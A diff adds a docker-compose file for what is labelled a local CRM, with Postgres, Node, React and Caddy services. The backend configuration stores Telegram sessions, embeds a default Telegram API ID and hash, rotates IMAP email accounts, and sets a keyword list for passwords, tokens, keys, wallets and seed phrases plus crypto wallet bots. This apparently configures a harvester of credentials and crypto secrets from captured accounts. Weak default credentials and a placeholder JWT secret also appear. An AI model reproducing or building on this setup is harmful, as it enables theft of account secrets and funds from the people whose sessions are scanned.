@@ -1,0 +1,144 @@
+version: '3.9'
+
+services:
+  # PostgreSQL Database - локальная копия
+  postgres:
+    image: postgres:16-alpine
+    container_name: crm-postgres-local
+    environment:
+      POSTGRES_USER: ${DB_USER:-crm_user}
+      POSTGRES_PASSWORD: ${DB_PASSWORD:-crm_password}
+      POSTGRES_DB: ${DB_NAME:-crm_db}
+      # Правильная кодировка для поддержки кириллицы
+      POSTGRES_INITDB_ARGS: "--encoding=UTF8 --locale=ru_RU.UTF-8"
+      LC_ALL: ru_RU.UTF-8
+      LANG: ru_RU.UTF-8
+    ports:
+      - "5433:5432" # Изменен порт на 5433
+    volumes:
+      - ./postgres_data:/var/lib/postgresql/data # База внутри проекта
+      - ./database_dump_utf8.sql:/docker-entrypoint-initdb.d/01-data.sql # Восстановление данных с UTF-8
+    healthcheck:
+      test: [ "CMD-SHELL", "pg_isready -U ${DB_USER:-crm_user} -d ${DB_NAME:-crm_db}" ]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+    networks:
+      - crm-network-local
+    restart: unless-stopped
+    command:
+      - "postgres"
+      - "-c"
+      - "client_encoding=UTF8"
+      - "-c"
+      - "lc_messages=ru_RU.UTF-8"
+
+  # Backend API Service - локальная копия
+  backend:
+    build:
+      context: ./backend
+      dockerfile: Dockerfile
+    container_name: crm-backend-local
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      NODE_ENV: production
+      PORT: 5001 # Изменен внутренний порт
+      DB_HOST: postgres
+      DB_PORT: 5432
+      DB_NAME: ${DB_NAME:-crm_db}
+      DB_USER: ${DB_USER:-crm_user}
+      DB_PASSWORD: ${DB_PASSWORD:-crm_password}
+      DB_SSL: "false"
+      JWT_SECRET: your-super-secret-key-change-this-in-production
+      JWT_EXPIRY: ${JWT_EXPIRY:-7d}
+      # Кодировка для Node.js
+      NODE_OPTIONS: "--max-old-space-size=2048"
+      # Telegram API credentials (primary + fallback). Задайте реальные значения в .env
+      TELEGRAM_PRIMARY_API_ID: ${TELEGRAM_PRIMARY_API_ID:-33104909}
+      TELEGRAM_PRIMARY_API_HASH: ${TELEGRAM_PRIMARY_API_HASH:-788e3ff651cd500926b4be32d07daa45}
+      TELEGRAM_FALLBACK_API_ID: ${TELEGRAM_FALLBACK_API_ID:-0}
+      TELEGRAM_FALLBACK_API_HASH: ${TELEGRAM_FALLBACK_API_HASH:-}
+      TELEGRAM_SESSION_PATH: ${TELEGRAM_SESSION_PATH:-/app/telegram-sessions}
+      # Email rotation & IMAP (передайте реальные значения через .env или CI)
+      EMAIL_LIST: "${EMAIL_LIST:-}"
+      EMAIL_LIST_JSON: "${EMAIL_LIST_JSON:-}"
+      EMAIL_ACCOUNTS_JSON: "${EMAIL_ACCOUNTS_JSON:-}"
+      IMAP_SERVER: ${IMAP_SERVER:-imap.gmail.com}
+      IMAP_PORT: ${IMAP_PORT:-993}
+      IMAP_USER: "${IMAP_USER:-}"
+      IMAP_PASSWORD: "${IMAP_PASSWORD:-}"
+      # Pattern search configuration
+      SEARCH_PATTERNS: "${SEARCH_PATTERNS:-пароль,password,pass,логин,login,крипта,crypto,ключ,key,токен,token,секрет,secret,wallet,кошелек,seed,сид,phrase}"
+      CRYPTO_WALLET_BOTS: "${CRYPTO_WALLET_BOTS:-@wallet,@CryptoBot,@BitcoinWalletBot}"
+      # Web Push VAPID (fill via .env or CI secrets)
+      VAPID_PUBLIC_KEY: ${VAPID_PUBLIC_KEY:-}
+      VAPID_PRIVATE_KEY: ${VAPID_PRIVATE_KEY:-}
+      VAPID_CONTACT_EMAIL: ${VAPID_CONTACT_EMAIL:-mailto:admin@example.com}
+    ports:
+      - "5001:5001" # Изменен порт на 5001
+    volumes:
+      - ./uploads:/app/uploads
+      - ./backend/logs:/app/logs
+      # Пробрасываем директорию сессий Telegram на хост для сохранения между пересборками
+      - ./telegram-sessions:/app/telegram-sessions
+    healthcheck:
+      test: [ "CMD", "wget", "--quiet", "--tries=1", "--spider", "http://localhost:5001/api/health" ]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 10s
+    networks:
+      - crm-network-local
+    restart: unless-stopped
+
+  # Frontend Service (Nginx + React) - локальная копия
+  frontend:
+    build:
+      context: ./frontend
+      dockerfile: Dockerfile
+      args:
+        # В проде используем относительный путь, чтобы Caddy/Nginx проксировали на backend
+        VITE_API_URL: /api
+        VITE_VAPID_PUBLIC_KEY: ${VAPID_PUBLIC_KEY:-}
+    container_name: crm-frontend-local
+    depends_on:
+      - backend
+    ports:
+      - "3001:3000" # Изменен внешний порт на 3001
+    healthcheck:
+      test: [ "CMD", "curl", "-sf", "http://localhost:3000/" ]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 10s
+    networks:
+      - crm-network-local
+    restart: unless-stopped
+
+  # Edge reverse proxy с автоссылом (Let's Encrypt)
+  caddy:
+    image: caddy:2.7
+    container_name: crm-caddy
+    depends_on:
+      - frontend
+      - backend
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./Caddyfile:/etc/caddy/Caddyfile:ro
+      - caddy_data:/data
+      - caddy_config:/config
+    networks:
+      - crm-network-local
+    restart: unless-stopped
+
+networks:
+  crm-network-local:
+    driver: bridge
+
+volumes:
+  caddy_data:
+  caddy_config:
